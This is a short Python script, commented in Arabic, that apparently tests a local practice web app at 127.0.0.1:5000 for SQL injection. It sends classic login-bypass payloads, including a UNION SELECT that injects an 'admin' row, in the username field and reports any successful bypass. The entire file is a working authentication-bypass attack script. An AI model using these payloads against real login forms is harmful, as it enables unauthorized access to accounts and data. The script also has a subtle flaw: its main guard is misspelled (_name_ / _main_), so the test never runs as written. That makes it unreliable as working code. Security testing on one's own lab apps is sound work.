import requests

# عنوان السيرفر المحلي
TARGET_URL = "http://127.0.0.1:5000/"

# حمولات SQL Injection لاختبار الثغرة
PAYLOADS = ["' OR '1'='1", "' OR 1=1 --", "' UNION SELECT 1, 'admin', '123' --"]


def test_sqli(url):
    print("=" * 50)
    print(f"[*] Starting SQL Injection Test on: {url}")
    print("=" * 50)

    for payload in PAYLOADS:
        data = {"username": payload, "password": "any_password"}

        try:
            response = requests.post(url, data=data)

            if "SUCCESS:" in response.text:
                print(f"\n[+] VULNERABILITY FOUND!")
                print(f"    Payload: {payload}")
                print("    Result: Bypass successful!")
            elif "ERROR:" in response.text:
                print(f"\n[!] SQL Error triggered with payload: {payload}")
            else:
                print(f"[-] Payload failed: {payload}")

        except Exception as e:
            print(f"[!] Connection Error: {e}")
            break


if _name_ == "_main_":
    test_sqli(TARGET_URL)